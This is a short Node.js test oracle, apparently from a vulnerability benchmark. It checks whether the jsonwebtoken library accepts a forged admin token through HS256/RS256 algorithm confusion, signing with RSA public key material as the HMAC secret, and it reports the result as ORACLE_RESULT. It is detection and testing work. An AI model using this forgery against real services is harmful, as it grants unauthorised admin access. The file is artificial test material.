let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64url(obj) {
  return Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  }));
}

try {
  const jwt = require('jsonwebtoken');

  // Benign control path: normal HS256 sign/verify must work first.
  const secret = 'oracle-secret-verify-control';
  const benignPayload = { sub: 'user42', role: 'reader' };
  const benignToken = jwt.sign(benignPayload, secret, { algorithm: 'HS256' });
  const benignVerified = jwt.verify(benignToken, secret);
  if (!benignVerified || benignVerified.sub !== 'user42' || benignVerified.role !== 'reader') {
    throw new Error('benign HS256 verification failed');
  }

  operation_completed = true;

  // Malicious path matching CVE-2022-23540 style issue:
  // Use a token signed with HS256 using the public key material as HMAC secret,
  // then verify with the same key material while allowing algorithm confusion.
  const rsaPublicKeyPem = [
    '-----BEGIN PUBLIC KEY-----',
    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfY9hY9Yx8RJWb1x1o1t',
    'nM9f6Y6x6x2Qw8w6J8cQW7xwQm1Yq7m2fQe3XK8M0m3QX3v4Qm3i8k2S5qVQm2D2',
    '7mS4g8K1aXx0q4z2Z1m9V5mR5Fz6r3Vw2mWw1L8mT4cM1lK9mGm2Qzv9x8b7v6y5',
    'h0v9hQf4uQG7mD6mQn4zWk8n9b2Vx6Qm1vR3yP2m5zQ4k8V9z6x3n2m1k4w9y8z7',
    'wQIDAQAB',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  const attackerPayload = { sub: 'attacker', admin: true };
  const forgedHsToken = jwt.sign(attackerPayload, rsaPublicKeyPem, { algorithm: 'HS256' });

  try {
    const out = jwt.verify(forgedHsToken, rsaPublicKeyPem, { algorithms: ['HS256', 'RS256'] });
    if (out && out.sub === 'attacker' && out.admin === true) {
      exploit_succeeded = true;
      evidence = 'algorithm confusion: HS256 token accepted with RSA public key material';
    } else {
      exploit_succeeded = false;
      evidence = 'malicious token accepted but payload mismatch';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'malicious token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

finish();